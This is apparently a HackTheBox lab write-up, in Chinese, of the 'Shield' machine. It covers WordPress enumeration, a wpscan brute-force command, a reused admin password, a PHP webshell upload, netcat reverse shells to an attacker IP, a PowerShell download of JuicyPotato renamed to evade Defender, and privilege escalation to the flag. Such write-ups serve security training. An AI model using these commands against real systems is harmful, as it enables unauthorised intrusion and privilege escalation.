# Shield
###### tags: `HTB_Starting Point`
1. Enumeration
* 老樣子，先用Ping測試一下，連線是否正常
```
ping -c 2 10.10.10.29
```

* 先進行Port scan，這次我們選用不同的參數(-A)，並儲存結果。
-A: Enable OS detection, version detection, script scanning, and traceroute
```
sudo nmap -A -oA /nmap/Shield 10.10.10.29
```
![](https://i.imgur.com/s4gqq1H.png)

* Discover on 80 Port 

![](https://i.imgur.com/8IpyIdg.png)

* 嘗試一下看有沒有robots.txt or login介面(X) 似乎都沒有

![](https://i.imgur.com/jHKuTj8.png)
* 那就一樣使用dirsearch，看有沒有隱藏的目錄
```
sudo python3 /opt/dirsearch/dirsearch.py -u http://10.10.10.29 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```
![](https://i.imgur.com/XRFn3hB.png)

* 由上圖結果，我們可以去看一下wordpress目錄(不過似乎也沒什麼特別的地方)

![](https://i.imgur.com/gtEJkKK.png)
* 由於是Wordpress，可以使用wpscan來掃描看看
```
wpscan --url http://10.10.10.29/wordpress --enumerate vp,vt,u,dbe -t 10
```
![](https://i.imgur.com/y1x0IFd.png)

* -e, --enumerate [OPTS] 
	* vp   Vulnerable plugins
	* vt   Vulnerable themes
	* dbe  Db exports
	* u    User IDs range. e.g: u1-5 (Value if no argument supplied: 1-10)
* -t, --max-threads VALUE
	* The max threads to use(Default: 5)
* 可以發現user id 只有admin一個，並且找到一個登入介面http://10.10.10.29/wordpress/wp-login.php

![](https://i.imgur.com/7qgYGo8.png)
![](https://i.imgur.com/fGTzAVa.png)

* 現在只缺admin密碼了，WPscan的確有爆破的工具，不過...
```
wpscan --url http://10.10.10.29/wordpress --usernames admin --passwords /usr/share/wordlists/rockyou.txt
```
* -P, --passwords FILE-PATH 
	* List of passwords to use during the password attack.(If no --username/s option supplied, user enumeration will be run.)
* -U, 
	* --usernames LIST：List of usernames to use during the password attack.
	* --multicall-max-passwords MAX_PWD：Maximum number of passwords to send by request with XMLRPC multicall(Default: 500)
	* --password-attack ATTACK：Force the supplied attack to be used rather than automatically determining one.Available choices: wp-login, xmlrpc, xmlrpc-multicall
	* --login-uri URI：The URI of the login page if different from /wp-login.php
	* --stealthy：lias for --random-user-agent --detection-mode passive --plugins-version-detection passive

![](https://i.imgur.com/pAhSVmZ.png)
![](https://i.imgur.com/9qVVeFn.png)
* 其實還挺花時間的，所以我們嘗試看看上一台主機中獲得帳號資訊!
admin : P@s5w0rd!

![](https://i.imgur.com/1mRbKxX.png)

成功登入後，會進到一個DashBorad介面!
2. Foothold(立足點)
* 現在只要找到上傳功能的選項，上傳反向shell。(請注意：由於是Windows計算機。因此，必須具有Windows php反向shell才能獲得訪問權限。)

* 先創建一個資料夾
```
mkdir windows_reverse
```
* 從Github上clone我們所需要的檔案及工具
```
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/php/simple-backdoor.php
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe
```
![](https://i.imgur.com/wPF0Eu4.png)

* 我們找到一個可以上傳的功能
```
Appearance -> Themes -> Add New -> upload Theme -> Browse 
```
![](https://i.imgur.com/PM20wfY.png)

* 點擊Install Now上傳後會跳出下面的畫面

![](https://i.imgur.com/6MLm0gJ.png)

* Google一下wordpress uploads預設的存放位置(http://10.10.10.29/wordpress/wp-content/uploads)

![](https://i.imgur.com/i4UUcoK.png)

* 現在我們有了一個簡單的綁定外殼。讓我們在netcat二進製文件的幫助下使用反向外殼。
```
http://10.10.10.29/wordpress/wp-content/uploads/simple-backdoor.php?cmd=dir
```
![](https://i.imgur.com/rIGPCJj.png)
* 執行nc.exe
```
http://10.10.10.29/Wordpress/wp-content/Uploads/simple-backdoor.php?cmd=.\nc.exe%20-e%20cmd.exe%2010.10.14.15%204444
```
![](https://i.imgur.com/B2Yw4NQ.png)
![](https://i.imgur.com/znWBs1s.png)
```
cd C:\Users
dir
cd sandra
```
3. Privilege Escalation(提權)
* 我們需要進一步枚舉來獲得任何獲得特權訪問權限的漏洞。首先，我們需要檢查系統信息。
```
systeminfo
```
![](https://i.imgur.com/UWsF3rB.png)

* 查看我們擁有那些權限
```
whoami /priv
```
![](https://i.imgur.com/UofDIVs.png)

* 我們有啟用SeImpersonatePrivilegeenabled的權限，這代表我們可以執行[juicy potato](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato)來提權。
* 從Github上下載JuicyPotato.exe
```
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```
![](https://i.imgur.com/yFGBwUv.png)

* 後將其重命名為另一個文件名。因為有時Windows Defender會檔掉
```
mv JuicyPotato.exe potato.exe
```
![](https://i.imgur.com/T9OKPzB.png)
* 在本機端上啟動python demon web服務器，用來上傳JuicyPotato
```
python3 -m http.server
```
![](https://i.imgur.com/NOweWR8.png)

* 在Windows主機端輸入下列指令，讓它去下載我們Web Server上的JuicyPotato檔案
```
Powershell -c "IWR -useBasicParsing http://10.10.14.15:8000/potato.exe -o potato.exe"
```
![](https://i.imgur.com/zgNbbUf.png)
![](https://i.imgur.com/lR2TC3k.png)
* 閱讀Juicy Potato的文檔，有提到需要運行Batch文件。因此，現在需要使用以下指令創建bat文件
```
echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.14.15 4545 > sh3ll.bat
```
* 使用type命令查看該文件以進行驗證
```
type sh3ll.bat
```
![](https://i.imgur.com/nl1w4QF.png)
* 再次打開netcat
```
nc -lvnp 4545
```
![](https://i.imgur.com/37UWvvQ.png)

* 執行以下命令。如果無法獲得反向外殼；更改使用此文檔的-c參數（CLSID）並再次運行。
```
.\potato.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -p C:\inetpub\wwwroot\wordpress\wp-content\Uploads\sh3ll.bat -l 1337
```
![](https://i.imgur.com/t9BbE1X.png)

* 最終我們取得了權限，就剩下Get Flag了!

![](https://i.imgur.com/KobeFsM.png)

```
type ../../Users/Administrator/Desktop/root.txt
```
![](https://i.imgur.com/kA0MJ8T.png)


